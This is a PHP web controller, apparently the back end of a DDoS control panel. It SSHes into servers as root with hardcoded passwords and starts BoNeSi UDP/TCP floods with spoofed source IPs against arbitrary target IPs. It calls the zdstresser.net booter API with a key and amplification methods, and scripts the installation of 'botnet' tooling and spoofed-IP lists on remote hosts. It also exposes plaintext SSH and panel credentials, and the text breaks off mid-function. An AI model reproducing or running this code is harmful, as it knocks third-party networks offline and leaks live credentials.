<?php if(!defined('BASEPATH')) exit('No direct script access allowed');

require APPPATH . 'libraries/crontab.php';
require APPPATH . 'libraries/routeros_api.class.php';

require_once APPPATH . '../vendor/autoload.php';

//use phpseclib3\Net\SSH2;
use phpseclib\Net\SSH2;

/**
 * Class : Login (LoginController)
 * Login class to control to authenticate user credentials and starts user's session.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
class ZeroTest extends CI_Controller
{
    /**
     * @var CI_Loader
     */
    public $load;

    /**
     * @var CI_Input
     */
    public $input;

    /**
     * @var CI_Output
     */
    public $output;

    /**
     * @var CI_Session
     */
    public $session;

    /**
     * @var Other_model
     */
    public $Other_model;

    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
        
        // Load models and other resources as before
        $this->load->model('users_model');
        $this->load->model('user_model');
        $this->load->model('Invoices_model');
        $this->load->model('Services_model');
        $this->load->model('Other_model');
        $this->load->model('login_model');
        $this->load->model('Reports_model');
        $this->load->helper(array('form', 'url'));
        
        // Add authentication before any controller method runs
        $this->_authenticate();
        
        // Enable error reporting for debugging
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);
    }

    private function _authenticate()
    {
        // Skip authentication in CLI mode
        if (php_sapi_name() === 'cli' || defined('STDIN')) {
            return true;
        }

        // Check if authentication is already in session to avoid repeated prompts
        if ($this->session->userdata('authenticated') === true) {
            return true;
        }

        // Check for HTTP Basic Authentication
        $username = isset($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : '';
        $password = isset($_SERVER['PHP_AUTH_PW']) ? $_SERVER['PHP_AUTH_PW'] : '';
        
        // Check against hardcoded credentials
        if ($username === 'root' && $password === 'Root@321') {
            // Store in session to prevent repeated authentication
            $this->session->set_userdata('authenticated', true);
            return true;
        }
        
        // Authentication failed, send headers to prompt for credentials
        header('WWW-Authenticate: Basic realm="Access to ZeroTest Controller"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Authentication required';
        exit;
    }

    /**
     * Index Page for this controller.
     */
    public function index()
    {
        $this->isLoggedIn();
    }

    
    function get_publicIP1(){

        /* for Android APP 
        //$json_data = $this->input->raw_input_stream;
        //$data = json_decode($json_data, true);
        
        //$ip = $data['ip'];
        //$ip = "103.169.64.101";

        */

        $ip = $this->get_client_ip();

        $duration = 3600;
        //$ip = "83.110.169.94";

        $command = "nohup perl /root/target2.pl --target_ip=".$ip." --num_sessions=2 --protocol=UDP --duration=".$duration;

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);
        
        //echo $command;
        //exit;

        $this->Other_model->add_ipUpdaterCall($apiInfo);

        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", $command);

        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

        //$this->load->view("Other/getpublicip", NULL);
        
    }

    function test_publicIP($ip, $duration){

        $command = "nohup perl /root/target2.pl --target_ip=".$ip." --num_sessions=1 --protocol=UDP --duration=".$duration;

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);

        $this->Other_model->add_ipUpdaterCall($apiInfo);

        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", $command);

        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

    }

    // These functions will get ip details from android app
    function get_publicIP_fromapp($device_name = null, $client_ip = null) 
    {
        log_message('info', 'get_publicIP_fromapp: ' . $device_name . ' - ' . $client_ip);
        
        try {
            // First check URL segments
            if ($device_name === null || $client_ip === null) {
                // If not in URL, check POST/JSON data
                $json_data = file_get_contents('php://input');
                $data = json_decode($json_data, true);

                $device_name = isset($data['deviceName']) ? $data['deviceName'] : $this->input->post('deviceName');
                $client_ip = isset($data['clientIP']) ? $data['clientIP'] : $this->input->post('clientIP');
            }

            // If still no client IP, try to detect it
            if (empty($client_ip)) {
                $client_ip = $this->get_client_ip();
            }

            // Validate inputs
            if (empty($device_name)) {
                $this->output->set_status_header(400)
                            ->set_content_type('application/json')
                            ->set_output(json_encode([
                                'status' => 'error',
                                'message' => 'Device name is required'
                            ]));
                return;
            }

            if (empty($client_ip)) {
                $this->output->set_status_header(400)
                            ->set_content_type('application/json')
                            ->set_output(json_encode([
                                'status' => 'error',
                                'message' => 'Client IP could not be determined'
                            ]));
                return;
            }

            // Path to the JSON file
            $file_path = FCPATH . 'server_config/client_apps.json';
            $dir_path = FCPATH . 'server_config';

            // Create directory if it doesn't exist
            if (!file_exists($dir_path)) {
                mkdir($dir_path, 0755, true);
            }

            // Read existing data
            $clients = [];
            if (file_exists($file_path)) {
                $content = file_get_contents($file_path);
                if ($content) {
                    $clients = json_decode($content, true) ?: [];
                }
            }

            // Update or add client information
            $clients[$device_name] = [
                'ip' => $client_ip,
                'last_updated' => date('Y-m-d H:i:s'),
                'first_seen' => isset($clients[$device_name]) ? 
                               $clients[$device_name]['first_seen'] : 
                               date('Y-m-d H:i:s')
            ];

            // Save updated data
            file_put_contents($file_path, json_encode($clients, JSON_PRETTY_PRINT));

            // Return minimal success response for API calls
            $this->output->set_status_header(200)
                        ->set_content_type('application/json')
                        ->set_output(json_encode([
                            'status' => 'success'
                        ]));

        } catch (Exception $e) {
            $this->output->set_status_header(500)
                        ->set_content_type('application/json')
                        ->set_output(json_encode([
                            'status' => 'error',
                            'message' => $e->getMessage()
                        ]));
        }
    }

    // Add this new function to display the view
    public function view_client_apps()
    {
        // Path to the clients JSON file
        $clients_file = FCPATH . 'server_config/client_apps.json';
        
        // Path to the servers JSON file
        $servers_file = FCPATH . 'server_config/servers.json';
        
        // Read client data
        $data['clients'] = [];
        if (file_exists($clients_file)) {
            $content = file_get_contents($clients_file);
            if ($content) {
                $data['clients'] = json_decode($content, true) ?: [];
            }
        }
        
        // Read server data
        $data['servers'] = [];
        if (file_exists($servers_file)) {
            $content = file_get_contents($servers_file);
            if ($content) {
                $data['servers'] = json_decode($content, true) ?: [];
            }
        }
        
        // Load the view with both clients and servers data
        $this->load->view('Other/get_publicIP_fromapp', $data);
    }

    //Get Client Browser IP
    private function get_client_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            $ip = explode(',', $ip)[0];
            return $ip;
        } else {
            if (!empty($_SERVER['REMOTE_ADDR'])) {
                return $_SERVER['REMOTE_ADDR'];
            }
        }
    }

    function call_testAPI(){

        $json_data = $this->input->raw_input_stream;
        $data = json_decode($json_data, true);

        $ip = $data['ip'];
        //$ip = "45.82.65.91";

        $duration = 300;
        //$ip = "103.204.33.45";

        $command = "nohup sudo perl /root/target2.pl --target_ip=".$ip." --num_sessions=3 --protocol=UDP --duration=".$duration;

        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", $command);

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);

        $this->Other_model->add_ipUpdaterCall($apiInfo);
        //$this->load->view("Other/getpublicip", NULL);
        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

    }

    public function execute_remote_command($host, $username, $password, $command = "ls -la") {

        
        // Create SSH connection (your existing code)
        $ssh = new SSH2($host);

        if (!$ssh->login($username, $password)) {
            echo 'Host: '.substr(strrchr($host, '.'), 1).' Login Failed';
            return;
        }

        // Execute the command (your existing code)
        $output = $ssh->exec($command);
        return $output;

    }

    public function execute_remote_command_old($host, $username, $password, $command = "ls -la")
    {

    
        // Create SSH connection (your existing code)
        $ssh = new SSH2($host);

        if (!$ssh->login($username, $password)) {
            echo 'Host: '.substr(strrchr($host, '.'), 1).' Login Failed';
            return;
        }

        // Execute the command (your existing code)
        $output = $ssh->exec($command);
        return $output;

    }

    public function callApi() {
        // Set fixed parameters
        $userid = "50186";
        $key = "CGBQL-63581-LAT9E";
        $command = "post.attack";
        $hub = "pro";
        $type = "ip4";
        $method = "id::123"; // Keep raw
        $custom = "amp=DNS,DNSSEC,NTP,NAT,WSD,COAP,QUIC,SSDP,SNMP,UBNT,ARM3,IPSEC,UDPMIX,SOURCE,PORTMAP,OPENVPN,NETBIOS,ARD,CHARGEN,RDP,STEAM,FIVEM,CALL,"; // Keep raw

        // Get user input for dynamic parameters
        $target = $this->input->get('target');
        $port = $this->input->get('port');
        $time = $this->input->get('time');

        // Validate inputs
        if (empty($target) || empty($port) || empty($time)) {
            echo json_encode(['error' => 'All parameters (target, port, time) are required.']);
            return;
        }

        // Validate the time parameter
        $maxTimeLimit = 1800;
        if ($time > $maxTimeLimit) {
            echo json_encode(['error' => 'Time exceeds maximum allowed limit of 1800 seconds.']);
            return;
        }

        $curlCommand = "curl -X GET \"https://zdstresser.net/panel/apiv1/"
            . "?userid=$userid"
            . "&key=$key"
            . "&command=$command"
            . "&hub=$hub"
            . "&type=$type"
            . "&target=$target"
            . "&port=$port"
            . "&time=$time"
            . "&method=$method"
            . "&custom:$custom\"";


        //echo $curlCommand;
        //echo $response;

        $command = "https://zdstresser.net/panel/apiv1/?userid=50186&key=CGBQL-63581-LAT9E&command=post.attack&hub=pro&type=ip4&target=202.163.81.0&port=80&time=30&method=id::123&custom:amp=DNS,DNSSEC,NTP,NAT,WSD,COAP,QUIC,SSDP,SNMP,UBNT,ARM3,IPSEC,UDPMIX,SOURCE,PORTMAP,OPENVPN,NETBIOS,ARD,CHARGEN,RDP,STEAM,FIVEM,CALL,";
        $response = shell_exec("curl -X GET ".$command);
        echo $response;
        exit;

        // Execute the curl command using shell_exec
        $response = shell_exec($curlCommand);

        // Check for errors
        if ($response === null) {
            echo json_encode(['error' => 'Failed to execute the curl command.']);
            return;
        }

        // Return the API response
        echo $response;
    }

    public function server_information() 
    {
        // Path to store server information
        $file_path = FCPATH . 'server_config/servers.json';
        $dir_path = FCPATH . 'server_config';
        
        if ($this->input->server('REQUEST_METHOD') === 'POST') {
            $server_name = $this->input->post('server_name');
            $server_ip = $this->input->post('server_ip');
            $ssh_user = $this->input->post('ssh_user');
            $ssh_password = $this->input->post('ssh_password');
            $server_pin = $this->input->post('server_pin');
            
            // Validate inputs
            if (empty($server_name) || empty($server_ip) || empty($ssh_user) || 
                empty($ssh_password) || empty($server_pin)) {
                $this->session->set_flashdata('error', 'All fields are required');
                redirect('ZeroTest/server_information');
                return;
            }
            
            // Validate PIN format
            if (!preg_match('/^\d{6}$/', $server_pin)) {
                $this->session->set_flashdata('error', 'PIN must be 6 digits');
                redirect('ZeroTest/server_information');
                return;
            }
            
            // Create directory if it doesn't exist
            if (!file_exists($dir_path)) {
                if (!@mkdir($dir_path, 0755, true)) {
                    $error = error_get_last();
                    $this->session->set_flashdata('error', 'Failed to create directory: ' . $error['message']);
                    redirect('ZeroTest/server_information');
                    return;
                }
            }
            
            // Check directory permissions
            if (!is_writable($dir_path)) {
                $this->session->set_flashdata('error', 'Directory is not writable: ' . $dir_path);
                redirect('ZeroTest/server_information');
                return;
            }
            
            // Read existing data
            $servers = [];
            if (file_exists($file_path)) {
                if (!is_readable($file_path)) {
                    $this->session->set_flashdata('error', 'Configuration file is not readable');
                    redirect('ZeroTest/server_information');
                    return;
                }
                
                $json_content = @file_get_contents($file_path);
                if ($json_content === false) {
                    $error = error_get_last();
                    $this->session->set_flashdata('error', 'Failed to read configuration: ' . $error['message']);
                    redirect('ZeroTest/server_information');
                    return;
                }
                
                $decoded = json_decode($json_content, true);
                if (json_last_error() !== JSON_ERROR_NONE) {
                    $this->session->set_flashdata('error', 'Invalid JSON in configuration file: ' . json_last_error_msg());
                    redirect('ZeroTest/server_information');
                    return;
                }
                
                if (is_array($decoded)) {
                    $servers = $decoded;
                }
            }
            
            // Add or update server
            $servers[$server_name] = [
                'ip' => $server_ip,
                'user' => $ssh_user,
                'password' => $ssh_password,
                'pin' => $server_pin
            ];
            
            // Save to file
            $json_data = json_encode($servers, JSON_PRETTY_PRINT);
            if ($json_data === false) {
                $this->session->set_flashdata('error', 'Failed to encode server data: ' . json_last_error_msg());
                redirect('ZeroTest/server_information');
                return;
            }
            
            if (@file_put_contents($file_path, $json_data) === false) {
                $error = error_get_last();
                $this->session->set_flashdata('error', 'Failed to save configuration: ' . $error['message']);
                redirect('ZeroTest/server_information');
                return;
            }
            
            // Set proper permissions for the file
            @chmod($file_path, 0644);
            
            $this->session->set_flashdata('success', 'Server information saved successfully');
            redirect('ZeroTest/server_information');
            return;
        }
        
        // Read existing servers for display
        $data['servers'] = [];
        if (file_exists($file_path)) {
            if (is_readable($file_path)) {
                $json_content = @file_get_contents($file_path);
                if ($json_content !== false) {
                    $decoded = json_decode($json_content, true);
                    if (is_array($decoded)) {
                        $data['servers'] = $decoded;
                    }
                }
            }
        }
        
        // Ensure servers is always an array
        if (!is_array($data['servers'])) {
            $data['servers'] = [];
        }
        
        $this->load->view('Other/server_information', $data);
    }

    // Update the get_sessions_bonesi function to use the config file
    public function get_sessions_bonesi() 
    {
        $file_path = FCPATH . 'server_config/servers.json';
        if (!file_exists($file_path)) {
            die("Server configuration file not found");
        }
        
        $servers = json_decode(file_get_contents($file_path), true);
        if (!is_array($servers)) {
            die("Invalid server configuration");
        }
        
        $all_sessions = [];
        foreach ($servers as $server_name => $server_info) {
            $output = $this->execute_remote_command(
                $server_info['ip'], 
                $server_info['user'], 
                $server_info['password'], 
                "ps aux | grep bonesi"
            );
            
            // Parse the bonesi output to get PIDs and IPs
            $grouped_sessions = [];
            $lines = explode("\n", $output);
            
            foreach ($lines as $line) {
                if (strpos($line, 'bonesi') !== false && strpos($line, 'grep') === false) {
                    preg_match('/\s+(\d+)\s+/', $line, $pid_matches);
                    preg_match('/(\d+\.\d+\.\d+\.\d+):(\d+)/', $line, $ip_matches);
                    
                    if (!empty($pid_matches[1]) && !empty($ip_matches[1])) {
                        $ip = $ip_matches[1];
                        $port = $ip_matches[2];
                        $pid = $pid_matches[1];
                        
                        $key = $ip . ':' . $port;
                        if (!isset($grouped_sessions[$key])) {
                            $grouped_sessions[$key] = [
                                'ip' => $ip,
                                'port' => $port,
                                'pids' => []
                            ];
                        }
                        $grouped_sessions[$key]['pids'][] = $pid;
                    }
                }
            }

            // Convert grouped sessions to final format
            $sessions = [];
            foreach ($grouped_sessions as $session) {
                $sessions[] = [
                    'ip' => $session['ip'] . ':' . $session['port'],
                    'pid' => implode('-', $session['pids'])
                ];
            }
            
            $all_sessions[$server_name] = [
                'sessions' => $sessions,
                'traffic' => '' // Empty traffic info initially
            ];
        }

        $data['all_sessions'] = $all_sessions;
        $data['server_list'] = $servers;
        $this->load->view("Other/get_sessions_bonesi", $data);
    }

    // Update kill_session function
    public function kill_session() 
    {
        $pids = $this->input->post('pid');
        $server = $this->input->post('server');
        $pin = $this->input->post('pin');
        
        if ($pids && $server && $pin) {
            $file_path = FCPATH . 'server_config/servers.json';
            $servers = json_decode(file_get_contents($file_path), true);
            
            if (!isset($servers[$server])) {
                echo json_encode(['status' => 'error', 'message' => 'Server not found']);
                return;
            }
            
            $server_info = $servers[$server];
            
            // Validate server-specific PIN
            if (!isset($server_info['pin']) || $pin !== $server_info['pin']) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN for selected server']);
                return;
            }
            
            $pid_array = explode('-', $pids);
            
            foreach ($pid_array as $pid) {
                $command = "kill " . escapeshellarg(trim($pid));
                $output = $this->execute_remote_command(
                    $server_info['ip'],
                    $server_info['user'], 
                    $server_info['password'], 
                    $command
                );
            }
            echo json_encode(['status' => 'success']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Required parameters missing']);
        }
    }

    public function start_session() 
    {
        $ip = $this->input->post('ip');
        $duration = $this->input->post('duration');
        $server = $this->input->post('server');
        $pin = $this->input->post('pin');
        
        if ($ip && $duration && $server && $pin) {
            // Get server information from config file
            $file_path = FCPATH . 'server_config/servers.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Server configuration file not found']);
                return;
            }
            
            $servers = json_decode(file_get_contents($file_path), true);
            if (!is_array($servers)) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid server configuration']);
                return;
            }
            
            // Check if selected server exists in configuration
            if (!isset($servers[$server])) {
                echo json_encode(['status' => 'error', 'message' => 'Selected server not found in configuration']);
                return;
            }
            
            $server_info = $servers[$server];
            
            // Validate server-specific PIN
            if (!isset($server_info['pin']) || $pin !== $server_info['pin']) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN for selected server']);
                return;
            }
            
            $command = "nohup sudo perl /root/target2.pl --target_ip=" . escapeshellarg($ip) . 
                      " --num_sessions=1 --protocol=UDP --duration=" . escapeshellarg($duration);
            
            $output = $this->execute_remote_command(
                $server_info['ip'],
                $server_info['user'],
                $server_info['password'],
                $command
            );
            echo json_encode(['status' => 'success']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'All fields are required']);
        }
    }

    public function install_services()
    {
        $server = $this->input->post('server');
        $step = $this->input->post('step');
        
        if (!$server || !$step) {
            echo json_encode(['status' => 'error', 'message' => 'Missing parameters']);
            return;
        }

        // Get server information
        $file_path = FCPATH . 'server_config/servers.json';
        if (!file_exists($file_path)) {
            echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
            return;
        }

        $servers = json_decode(file_get_contents($file_path), true);
        if (!isset($servers[$server])) {
            echo json_encode(['status' => 'error', 'message' => 'Server not found']);
            return;
        }

        $server_info = $servers[$server];
        $output = '';

        try {
            switch ($step) {
                case 'dependencies':
                    // Check if required packages are already installed
                    $check_cmd = "dpkg -l | grep -E 'git|automake|build-essential|libnet-dev|libpcap-dev|iftop' | wc -l";
                    $installed_count = trim($this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $check_cmd
                    ));

                    if ($installed_count >= 6) {
                        $output = "Required packages are already installed. Skipping installation.\n";
                    } else {
                        $command = "sudo apt update -y && sudo apt install git automake build-essential libnet-dev libpcap-dev iftop vnstat -y";
                        $output = $this->execute_remote_command(
                            $server_info['ip'],
                            $server_info['user'],
                            $server_info['password'],
                            $command
                        );
                    }
                    break;

                case 'clone':
                    // Check if bonesi is already installed
                    $check_bonesi = "which bonesi 2>/dev/null";
                    $bonesi_exists = trim($this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $check_bonesi
                    ));

                    if (!empty($bonesi_exists)) {
                        $output = "BoNeSi is already installed at: $bonesi_exists\nSkipping installation.\n";
                        // Skip only bonesi installation steps
                        echo json_encode([
                            'status' => 'success',
                            'output' => $output,
                            'skip_to_script' => true  // New flag to skip to setup_script
                        ]);
                        return;
                    }

                    $command = "cd /tmp && rm -rf bonesi && git clone https://github.com/Markus-Go/bonesi.git";
                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );
                    break;

                case 'configure':
                    $command = "cd /tmp/bonesi && ./configure";
                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );
                    break;

                case 'make':
                    $command = "cd /tmp/bonesi && make";
                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );
                    break;

                case 'install':
                    $command = "cd /tmp/bonesi && sudo make install";
                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );
                    break;

                case 'setup_script':
                    // First create directory and set permissions
                    $commands = [
                        "sudo mkdir -p /home/botnet",
                        "sudo chown -R {$server_info['user']}:{$server_info['user']} /home/botnet",
                        "sudo chmod -R 755 /home/botnet"
                    ];

                    foreach ($commands as $cmd) {
                        $output .= $this->execute_remote_command(
                            $server_info['ip'],
                            $server_info['user'],
                            $server_info['password'],
                            $cmd
                        );
                    }

                    // Create files directly on the server using echo
                    // Convert Windows line endings to Unix for subnets
                    $subnets = str_replace(["\r\n", "\r"], "\n", <<<'EOT'
101.102.103.0
103.10.108.0
103.101.215.0
103.123.131.0
103.123.182.0
103.125.224.0
103.141.214.0
103.157.55.0
103.165.152.0
103.165.153.0
103.169.213.0
103.177.50.0
103.224.174.0
103.232.218.0
103.242.79.0
103.246.36.0
103.248.10.0
103.55.254.0
103.56.211.0
103.73.115.0
103.9.96.0
104.129.144.0
104.133.128.0
104.154.0.0
104.154.112.0
104.154.113.0
104.154.114.0
104.154.115.0
104.154.116.0
104.154.117.0
104.154.118.0
104.154.119.0
104.154.120.0
104.154.121.0
104.154.122.0
104.154.123.0
104.154.126.0
104.154.128.0
104.154.144.0
104.154.160.0
104.154.16.0
104.154.176.0
104.154.192.0
104.154.208.0
104.154.224.0
104.154.240.0
104.154.32.0
104.154.48.0
104.154.64.0
104.154.80.0
104.154.96.0
104.155.0.0
104.155.112.0
104.155.128.0
104.155.144.0
104.155.160.0
104.155.16.0
104.155.176.0
104.155.192.0
104.155.208.0
104.155.224.0
104.155.240.0
104.155.32.0
104.155.48.0
104.155.64.0
104.155.80.0
104.155.96.0
104.195.120.0
104.195.127.0
104.196.0.0
104.196.112.0
104.196.128.0
104.196.144.0
104.196.160.0
104.196.16.0
104.196.176.0
104.196.192.0
104.196.208.0
104.196.224.0
104.196.240.0
104.196.32.0
104.196.48.0
104.196.64.0
104.196.65.0
104.196.66.0
104.196.67.0
104.196.68.0
104.196.69.0
104.196.70.0
104.196.71.0
104.196.72.0
104.196.73.0
104.196.74.0
104.196.75.0
104.196.76.0
104.196.77.0
104.196.78.0
104.196.79.0
104.196.80.0
104.196.96.0
EOT
);

                    // Add the bash script for IP generation
                    $bash_script = <<<'EOT'
#!/bin/bash

# Function to generate a random number between min and max
random_number() {
    local min=$1
    local max=$2
    echo $(( ( RANDOM % (max - min + 1) ) + min ))
}

# Create temporary file for unique IPs
temp_file=$(mktemp)
target_count=200000
current_count=0

# Read each subnet
while IFS= read -r subnet; do
    # Skip empty lines
    [ -z "$subnet" ] && continue
    
    # Get base network address
    IFS='.' read -r b1 b2 b3 b4 <<< "$subnet"
    base_ip="${b1}.${b2}.${b3}"
    
    # Calculate IPs per subnet
    ips_per_subnet=$((target_count / $(wc -l < /home/botnet/subnets.txt) + 1))
    
    # Generate random IPs for this subnet
    for ((i=0; i<ips_per_subnet && current_count<target_count; i++)); do
        # Generate last octet (1-254 to avoid network and broadcast)
        last_octet=$(random_number 1 254)
        echo "${base_ip}.${last_octet}" >> "$temp_file"
        ((current_count++))
    done
done < /home/botnet/subnets.txt

# Sort IPs and remove duplicates
sort -u "$temp_file" | head -n 200000 > /home/botnet/trans_dns1.csv

# Cleanup
rm -f "$temp_file"

# Print completion message
echo "Generated $(wc -l < /home/botnet/trans_dns1.csv) unique IPs"
EOT;

                    // Create files using echo and sudo tee, with proper line endings
                    $commands = [
                        // Write subnets file with tr to ensure Unix line endings
                        "echo -n '" . str_replace("'", "'\"'\"'", $subnets) . "' | tr -d '\\r' | sudo tee /home/botnet/subnets.txt > /dev/null",
                        "echo '" . str_replace("'", "'\"'\"'", $bash_script) . "' | tr -d '\\r' | sudo tee /home/botnet/generate_ips.sh > /dev/null",
                        "sudo dos2unix /home/botnet/generate_ips.sh 2>/dev/null || true",
                        "sudo dos2unix /home/botnet/subnets.txt 2>/dev/null || true",
                        "sudo chown root:root /home/botnet/subnets.txt /home/botnet/generate_ips.sh",
                        "sudo chmod 644 /home/botnet/subnets.txt",
                        "sudo chmod 755 /home/botnet/generate_ips.sh",
                        // Add timeout to prevent hanging
                        "cd /home/botnet && timeout 300 sudo bash generate_ips.sh",
                        "sudo chown root:root /home/botnet/trans_dns1.csv 2>/dev/null || true",
                        "sudo chmod 644 /home/botnet/trans_dns1.csv 2>/dev/null || true"
                    ];

                    foreach ($commands as $cmd) {
                        try {
                            $cmd_output = $this->execute_remote_command(
                                $server_info['ip'],
                                $server_info['user'],
                                $server_info['password'],
                                $cmd
                            );
                            $output .= $cmd_output . "\n";
                            
                            // Add verification after script execution
                            if (strpos($cmd, 'generate_ips.sh') !== false) {
                                $verify_cmd = "wc -l /home/botnet/trans_dns1.csv 2>/dev/null || echo 'File not created'";
                                $file_check = trim($this->execute_remote_command(
                                    $server_info['ip'],
                                    $server_info['user'],
                                    $server_info['password'],
                                    $verify_cmd
                                ));
                                $output .= "IP file status: $file_check\n";
                            }
                        } catch (Exception $e) {
                            $output .= "Error executing command: " . $e->getMessage() . "\n";
                        }
                    }

                    // Final verification
                    $verify_cmd = "ls -l /home/botnet/";
                    $output .= "\nVerifying files:\n";
                    $output .= $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $verify_cmd
                    );
                    break;

                case 'setup_bonesi_script':
                    // Create the Perl script for BoNeSi sessions
                    $perl_script = <<<'EOT'
#!/usr/bin/perl

use strict;
use warnings;
use Getopt::Long;
use Time::HiRes qw(sleep);

# Read command-line arguments
my ($target_ip, $num_sessions, $protocol, $duration);
GetOptions(
    'target_ip=s'    => \$target_ip,
    'num_sessions=i' => \$num_sessions,
    'protocol=s'     => \$protocol,
    'duration=i'     => \$duration
);

unless ($target_ip && $num_sessions && $protocol && $duration) {
    die "Usage: $0 --target_ip=<TARGET_IP> --num_sessions=<NUM_SESSIONS> --protocol=<PROTOCOL> --duration=<DURATION_IN_SECONDS>\\n";
}

# Validate protocol
unless ($protocol eq 'UDP' || $protocol eq 'TCP') {
    die "Invalid protocol specified: $protocol. Use 'UDP' or 'TCP'.\\n";
}

# Function to generate a random port between 1024 and 65535
sub random_port {
    return int(rand(64512)) + 1024;
}

# Starting BoNeSi sessions
for (my $i = 1; $i <= $num_sessions; $i++) {
    my $port = random_port();
    my $cmd;

    if ($protocol eq 'UDP') {
        $cmd = "sudo nohup bonesi -i /home/botnet/trans_dns1.csv $target_ip:$port -p udp -s 1400 > /dev/null 2>&1 &";
    } elsif ($protocol eq 'TCP') {
        $cmd = "sudo nohup bonesi -i /home/botnet/trans_dns1.csv $target_ip:$port -p tcp -d ens160 -s 1450 > /dev/null 2>&1 &";
    }

    system($cmd);
    print "Started $protocol BoNeSi session $i targeting IP $target_ip on port $port\\n";
    sleep 3;
}

print "All BoNeSi sessions started. They will be terminated after $duration seconds.\\n";
EOT;

                    // Create the Perl script and set permissions
                    $commands = [
                        // Write Perl script with proper line endings
                        "echo '" . str_replace("'", "'\"'\"'", $perl_script) . "' | tr -d '\\r' | sudo tee /home/botnet/target2.pl > /dev/null",
                        "sudo chown root:root /home/botnet/target2.pl",
                        "sudo chmod 755 /home/botnet/target2.pl"
                    ];

                    foreach ($commands as $cmd) {
                        try {
                            $cmd_output = $this->execute_remote_command(
                                $server_info['ip'],
                                $server_info['user'],
                                $server_info['password'],
                                $cmd
                            );
                            $output .= $cmd_output . "\n";
                        } catch (Exception $e) {
                            $output .= "Error executing command: " . $e->getMessage() . "\n";
                        }
                    }

                    // Verify the Perl script was created
                    $verify_cmd = "ls -l /home/botnet/target2.pl";
                    $output .= "\nVerifying Perl script:\n";
                    $output .= $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $verify_cmd
                    );
                    break;

                default:
                    echo json_encode(['status' => 'error', 'message' => 'Invalid step']);
                    return;
            }

            echo json_encode([
                'status' => 'success',
                'output' => $output
            ]);

        } catch (Exception $e) {
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    public function verify_credentials()
    {
        $server = $this->input->post('server');
        $password = $this->input->post('password');
        $pin = $this->input->post('pin');
        
        if (!$server || !$password || !$pin) {
            echo json_encode(['status' => 'error', 'message' => 'Missing parameters']);
            return;
        }

        // Get server information
        $file_path = FCPATH . 'server_config/servers.json';
        if (!file_exists($file_path)) {
            echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
            return;
        }

        $servers = json_decode(file_get_contents($file_path), true);
        if (!isset($servers[$server])) {
            echo json_encode(['status' => 'error', 'message' => 'Server not found']);
            return;
        }

        $server_info = $servers[$server];
        
        // Verify credentials
        if ($server_info['password'] !== $password || $server_info['pin'] !== $pin) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid credentials']);
            return;
        }

        echo json_encode(['status' => 'success']);
    }

    public function get_traffic() {
        $server = $this->input->post('server');
        
        // Get server information
        $file_path = FCPATH . 'server_config/servers.json';
        if (!file_exists($file_path)) {
            echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
            return;
        }

        $servers = json_decode(file_get_contents($file_path), true);
        if (!isset($servers[$server])) {
            echo json_encode(['status' => 'error', 'message' => 'Server not found']);
            return;
        }

        $server_info = $servers[$server];
        
        try {
            // Get vnstat traffic info
            $traffic_output = $this->execute_remote_command(
                $server_info['ip'],
                $server_info['user'],
                $server_info['password'],
                "vnstat -tr 5"  // Run for 5 seconds
            );

            // Parse vnstat output to get rx and tx info
            $rx_rate = $tx_rate = "N/A";
            $rx_packets = $tx_packets = "N/A";
            
            if (preg_match('/rx\s+([0-9.]+\s+[A-Za-z]+\/s)\s+(\d+)\s+packets\/s/', $traffic_output, $rx_matches) &&
                preg_match('/tx\s+([0-9.]+\s+[A-Za-z]+\/s)\s+(\d+)\s+packets\/s/', $traffic_output, $tx_matches)) {
                $rx_rate = trim($rx_matches[1]);
                $rx_packets = $rx_matches[2];
                $tx_rate = trim($tx_matches[1]);
                $tx_packets = $tx_matches[2];
            }
            
